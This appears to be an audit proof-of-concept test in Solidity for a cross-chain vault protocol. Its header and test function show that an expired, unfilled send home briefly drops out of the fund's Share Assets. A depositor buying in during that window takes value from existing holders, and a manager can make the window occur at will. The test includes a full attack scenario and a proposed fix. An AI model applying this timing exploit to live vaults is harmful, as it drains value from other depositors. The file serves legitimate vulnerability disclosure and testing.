// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {CoreVaultFixture} from "../../unit/core/CoreVaultFixture.sol";
import {SpokeVault} from "../../../src/spoke/SpokeVault.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {ISpokeVault} from "../../../src/interfaces/ISpokeVault.sol";
import {Transit, TransferKind, BridgeQuote} from "../../../src/interfaces/FundTypes.sol";
import {Mandate, AdapterConfig, PoolConfig, BridgeAdapterConfig} from "../../../src/mandate/Mandate.sol";
import {ReportCodec} from "../../../src/libraries/ReportCodec.sol";
import {TransitMessage} from "../../../src/libraries/TransitMessage.sol";
import {MockPositionAdapter} from "../../mocks/spoke/MockPositionAdapter.sol";
import {MockBridgeAdapter as SpokeMockBridgeAdapter} from "../../mocks/spoke/MockBridgeAdapter.sol";
import {MockAcrossSpokePool as SpokeMockAcrossSpokePool} from "../../mocks/spoke/MockAcrossSpokePool.sol";
import {MockWormholeCore} from "../../mocks/spoke/MockWormholeCore.sol";

/// @title POC: an expired send home leaves Share Assets for a window that any depositor can buy into
/// @notice SEVERITY: medium (bounded value leak from every holder to a depositor who times the window; the window is
///         structural for every unfilled spoke-to-hub send, and a manager can create one at will).
///
/// FAILURE
///   The spoke drops a hub-bound transit from `inFlightToHub` once `fillDeadline + maxReportAge` has passed, presumed
///   filled (SpokeCrossChainLib._stillInFlight, OQ-09 stance). The hub values the return leg only from the latest
///   report's `inFlightToHub` (CoreVaultLogic._returnLeg), so from the first report built after that instant the
///   amount is in no value base: not in the spoke's Unallocated Balance (debited at the send), not in In-flight Value
///   (dropped), not in Idle (never arrived). When the send was NOT filled, its Across refund lands 55 to 90 minutes
///   after the deadline (DEC-063), about 30 to 65 minutes after the drop (maxReportAge is about 26.5 minutes), and
///   re-enters Share Assets only through a report built after `recognizeRefund` and delivered 15 to 20 minutes later.
///   Between the two reports Share Assets are understated by `amountToArrive`; mints stay open because the dropping
///   report is fresh. The hub-to-spoke direction was designed to avoid exactly this (QB11/QB10 stance: "the amount
///   stays in Share Assets until the refund is recognized"); the return leg has no such rule. DEC-104 is violated
///   ("no recognized value is outside all bases").
///
/// ATTACK
///   A depositor who sees an expired send home (public: `SentToHub` with its deadline, no `TransitReceived` on the
///   hub, the report's `inFlightToHub` losing the id) deposits during the window at the depressed Share Price and
///   exits after the refund report: they take `d / (A - X + d)` of X from the holders of record. A manager can make
///   the window deterministic: a send home whose quote leaves the relayer no fee (`outputAmount == amount` passes
///   `_checkQuote`, which only caps the fee from above) is never filled and always expires.
///
/// IMPACT
///   Here a 1,000,000 USDC fund with 500,000 on the spoke sends 400,000 home; the send expires; bob deposits
///   1,000,000 in the window and, after the refund report, exits with 1,219,622 USDC (975,056 in the honest run), taken
///   from alice, whose value falls from 997,250 to 747,054. Bounded by the expired amount (at most the Spoke Cap) times the depositor's share of the fund.
///
/// FIX
///   Keep an unfilled send in the report until its refund is recognized (or until a bound that covers the Across
///   refund latency, e.g. deadline + 3 hours), and let the hub keep counting a listed-then-vanished Principal leg
///   until it is credited or the spoke reports the refund (`cumulativeSentHome` plus a refunded counter would let the
///   hub tell the two apart). Symmetric with the hub-to-spoke rule.
contract POC_ReturnLegValuationGap is CoreVaultFixture {
    SpokeVault internal spoke;
    MockPositionAdapter internal spokeUni;
    SpokeMockBridgeAdapter internal spokeAcrossAdapter;
    SpokeMockAcrossSpokePool internal spokeAcross;
    MockWormholeCore internal wormhole;
    address internal guardian = makeAddr("guardian");

    function setUp() public override {
        super.setUp();
        // The real Spoke Vault (linked SpokeCrossChainLib) on Robinhood over the spoke mocks; the same Mandate, with
        // real spoke-side addresses, is given to the real Core Vault on Arbitrum.
        spokeUni = new MockPositionAdapter(guardian, false);
        spokeUni.addPool(SPOKE_POOL, address(spokeWeth), address(usdg));
        spokeAcross = new SpokeMockAcrossSpokePool();
        spokeAcrossAdapter = new SpokeMockBridgeAdapter(guardian, address(spokeAcross));
        wormhole = new MockWormholeCore();
        uint64 nonce = vm.getNonce(address(this));
        spokeVaultAddress = vm.computeCreateAddress(address(this), nonce);
        address predictedCore = vm.computeCreateAddress(address(this), nonce + 1);
        Mandate memory m = _mandateWithSpoke();

        vm.chainId(SPOKE);
        spoke = new SpokeVault(
            m,
            FUND_ID,
            SPOKE,
            predictedCore,
            address(usdg),
            address(spokeAcross),
            address(wormhole),
            address(escrowImpl),
            excess
        );
        spokeUni.setVault(address(spoke));
        spokeAcrossAdapter.setVault(address(spoke));
        vm.chainId(HUB);
        _deploy(m, _config(25));
        assertEq(address(spoke), spokeVaultAddress, "spoke prediction");
        assertEq(address(vault), predictedCore, "core prediction");
    }

    function _mandateWithSpoke() internal view returns (Mandate memory m) {
        m = _mandate(2000);
        m.adapters[1] = AdapterConfig(SPOKE, address(spokeUni));
        m.pools[1] = PoolConfig(SPOKE, address(spokeUni), SPOKE_POOL);
        m.bridgeAdapters[1] = BridgeAdapterConfig(SPOKE, SPOKE, address(spokeAcrossAdapter));
        m.spokes[0].spokeVault = bytes32(uint256(uint160(spokeVaultAddress)));
        m.spokes[0].spokeCap = 1_000_000e6;
    }

    /// @dev The spoke's own report (what `report()` would publish now), delivered to the hub.
    function _deliverSpokeReport() internal returns (ReportCodec.Report memory r) {
        r = spoke.buildReport();
        r.sequence = ++reportSequence;
        _deliver(r);
    }

    /// @dev Chainlink posts a new round after a warp; the mock needs the same to keep mints open (OQ-10).
    function _repostPrices() internal {
        prices.setPrice(address(weth), 2.5e9);
        prices.setPrice(address(spokeWeth), 2.5e9);
        prices.setPrice(address(usdg), 1e18);
    }

    function test_POC_expiredReturnLegLeavesShareAssetsForAWindowAnyDepositorCaptures() public {
        _deposit(alice, 1_000_000e6); // 997,500 Idle after the flow fee
        uint256 aliceShares = shares.balanceOf(alice);

        // The manager puts 500,000 on the spoke; the fill lands and the first report confirms it on the hub.
        bytes32 outbound = _send(500_000e6, 499_750e6);
        usdg.mint(address(spokeAcross), 499_750e6);
        spokeAcross.fill(
            address(spoke),
            address(usdg),
            499_750e6,
            TransitMessage.encode(FUND_ID, HUB, outbound, TransferKind.Principal)
        );
        _deliverSpokeReport();
        assertEq(vault.inFlightValue(), 0, "arrival confirmed");
        uint256 assetsBeforeSendHome = vault.shareAssets();
        assertEq(assetsBeforeSendHome, 497_500e6 + 499_750e6);

        // The manager sends 400,000 home. Counted in Share Assets as the return leg while the report lists it.
        vm.prank(manager);
        bytes32 homebound = spoke.sendToHub(400_000e6, TransferKind.Principal, 0, _quote(399_800e6));
        Transit memory t = spoke.hubBoundTransit(homebound);
        ReportCodec.Report memory listed = _deliverSpokeReport();
        assertEq(listed.inFlightToHub.length, 1);
        assertEq(vault.shareAssets(), 497_500e6 + 99_750e6 + 399_800e6);

        // Nobody fills it. At fillDeadline + maxReportAge the spoke presumes it filled and drops it from the report,
        // although its refund cannot have landed yet (DEC-063: 55 to 90 minutes after the deadline).
        vm.warp(uint256(t.fillDeadline) + MAX_REPORT_AGE + 1);
        ReportCodec.Report memory dropped = _deliverSpokeReport();
        assertEq(dropped.inFlightToHub.length, 0, "presumed filled");
        vm.expectRevert(abi.encodeWithSelector(ISpokeVault.NoRefund.selector, homebound));
        spoke.recognizeRefund(homebound);
        assertEq(usdc.balanceOf(address(vault)), 497_500e6, "nothing arrived on the hub");

        // The 399,800 USDC that will come back is in no value base: Share Assets fell by it and mints are open.
        uint256 assetsInGap = vault.shareAssets();
        assertEq(assetsInGap, 497_500e6 + 99_750e6);
        assertTrue(receiver.isReportFresh(0));
        _repostPrices();

        // Counterfactual: bob deposits the same amount after the refund report instead.
        uint256 snapshot = vm.snapshotState();
        _closeTheGap(homebound);
        _deposit(bob, 1_000_000e6);
        _request(bob, 2_000_000e6, ICoreVault.PayoutMode.Instant);
        uint256 honestPaid = _claim(bob).usdcPaid;
        uint256 aliceValueHonest = _valueOf(aliceShares);
        vm.revertToState(snapshot);

        // Attack: bob deposits inside the window, at a Share Price that ignores the 399,800 in transit.
        _deposit(bob, 1_000_000e6);
        uint256 bobShares = shares.balanceOf(bob);
        _closeTheGap(homebound);
        assertApproxEqAbs(
            vault.shareAssets(), 497_500e6 + 997_500e6 + 499_750e6, 1e6, "the refund is back in Share Assets"
        );

        _request(bob, 2_000_000e6, ICoreVault.PayoutMode.Instant);
        ICoreVault.PayoutReceipt memory r = _claim(bob);
        assertEq(r.sharesBurned, bobShares);
        assertEq(r.usdcOutstanding, 0);
        emit log_named_uint("bob paid in the honest run", honestPaid);
        emit log_named_uint("bob paid after depositing in the gap", r.usdcPaid);
        assertGt(r.usdcPaid, 1_000_000e6, "bob leaves with more than he deposited, Instant fees included");
        assertGt(r.usdcPaid - honestPaid, 200_000e6);

        // Alice, the only holder of record during the send, has paid for it.
        uint256 aliceValueAttack = _valueOf(aliceShares);
        assertLt(aliceValueAttack, aliceValueHonest);
        assertApproxEqRel(aliceValueHonest - aliceValueAttack, r.usdcGross - _grossOf(honestPaid), 0.01e18);
        emit log_named_uint("alice's value after the honest run", aliceValueHonest);
        emit log_named_uint("alice's value after the attack", aliceValueAttack);
    }

    /// @dev The Across refund lands in the escrow, anyone recognizes it on the spoke, the next report carries it home.
    function _closeTheGap(bytes32 transitId) internal {
        vm.warp(block.timestamp + 60 minutes);
        spokeAcross.refund(spoke.hubBoundTransit(transitId).escrow, address(usdg), 400_000e6);
        spoke.recognizeRefund(transitId);
        _deliverSpokeReport();
        _repostPrices();
    }

    function _valueOf(uint256 holderShares) internal view returns (uint256) {
        return holderShares * vault.shareAssets() / shares.totalSupply();
    }

    /// @dev Gross of an Instant payout from what was paid (2% Payout Fee + 0.25% flow fee on the gross).
    function _grossOf(uint256 paid) internal pure returns (uint256) {
        return paid * 10_000 / (10_000 - 200 - 25);
    }
}
